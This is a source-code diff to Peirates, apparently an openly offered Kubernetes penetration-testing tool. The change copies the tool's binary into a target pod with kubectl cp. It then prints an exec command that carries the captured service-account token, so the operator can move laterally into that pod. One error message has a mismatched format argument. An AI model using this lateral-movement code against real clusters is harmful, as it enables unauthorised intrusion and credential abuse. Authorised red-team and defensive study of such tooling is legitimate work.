@@ -248,47 +248,28 @@ func execInListPods(connectionString ServerInfo, pods []string, command string) 
 }
 
 func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
-	//if !kubectlAuthCanI(connectionString, "exec", "pods") {
-	//	println("[-] Permission Denied: your service account isn't allowed to exec into pods")
-	//	return
-	//}
+	if !kubectlAuthCanI(connectionString, "exec", "pods") {
+		println("[-] Permission Denied: your service account isn't allowed to exec into pods")
+		return
+	}
 
 	println("[+] Transferring a copy of Peirates into pod:", pod)
 
-	// modify the below so that we send in an stream of data that we read the equivalent of $_ from our own fs
+	// First, try copying the binary in via a kubectl cp command.
 	filename := os.Getenv("_")
-	// peiratesBinary, err := ioutil.ReadFile("./" + filename)
-	_, err := ioutil.ReadFile("./" + filename)
+	destination := pod + ":/tmp"
+
+	copyIntoPod, _, err := runKubectlSimple(connectionString, "cp", filename, destination)
 	if err != nil {
-		println("[-] Could not read peirates binary")
-		return
-	}
-	println("DEBUG: peiratesBinary loaded in - stopping now")
-	return
-
-	// Can we use this to push the binary through?
-	// runKubectlWithByteSliceForStdin is runKubectlSimple but you can pass in some bytes for stdin. Conven
-	// func runKubectlWithByteSliceForStdin(cfg ServerInfo, stdinBytes []byte, cmdArgs ...string) ([]byte, []byte, error) {
-
-	// copyIntoPodOut, _, err := runKubectlWithByteSliceForStdin(connectionString, kubectlBinary , "exec", "-it", pod, "--", "/bin/sh", "-c", "cat >/peirates ; chmod u+x /peirates")
-
-	copyIntoPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", pod, "--", "/bin/sh", "-c", "cat >/peirates ; chmod u+x /peirates")
-	if err != nil {
-		fmt.Printf("[-] Copying peirates into Pod %s failed: %s\n", pod, err)
+		fmt.Printf("[-] Copying peirates into pod %s failed: %s\n", pod)
 	} else {
-		println(" ")
-		println(string(copyIntoPodOut))
-	}
+		println(string(copyIntoPod))
+		println("[+] Transfer successful")
+		println("Now, start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:")
+		println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates")
+		// Feature request: give the user the option to exec into the next pod.
 
-	// modify the below so that we begin a true interactive session with that pod, running peirates directly.
-	execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", pod, "--", "/bin/sh", "-c", "/peirates")
-	if err != nil {
-		fmt.Printf("[-] Executing peirates in Pod %s failed: %s\n", pod, err)
-	} else {
-		println(" ")
-		println(string(execInPodOut))
 	}
-
 }
 
 //-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -781,7 +762,7 @@ func banner(connectionString ServerInfo) {
 ,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 ________________________________________
-	Peirates v1.0.21 by InGuardians
+	Peirates v1.0.22 by InGuardians
   https://www.inguardians.com/peirates
 ----------------------------------------------------------------`)
 
